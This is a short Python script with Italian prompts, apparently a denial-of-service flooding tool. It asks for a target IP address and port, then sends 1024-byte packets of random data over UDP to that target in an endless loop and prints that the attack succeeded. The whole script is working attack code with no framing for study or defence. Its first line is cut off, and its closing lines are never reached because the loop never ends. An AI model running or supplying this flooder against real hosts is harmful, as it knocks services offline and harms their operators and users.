mport socket
import random

ip_target = input("Inserisci l'indirizzo IP del bersaglio target: ")
porta_target = int(input("Inserisci il numero della porta del bersaglio target: "))
byte_da_inviare = int(input("Inserisci il numero di KB da inviare: "))

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

conto_byte = byte_da_inviare

pacchetto_dati = random.randbytes(1024)

while True:
    for _ in range(conto_byte):
        s.sendto(pacchetto_dati, (ip_target, porta_target))
        print("Pacchetto inviato a", ip_target, "sulla porta", porta_target)

s.close()

print("Attacco andato a buon fine")


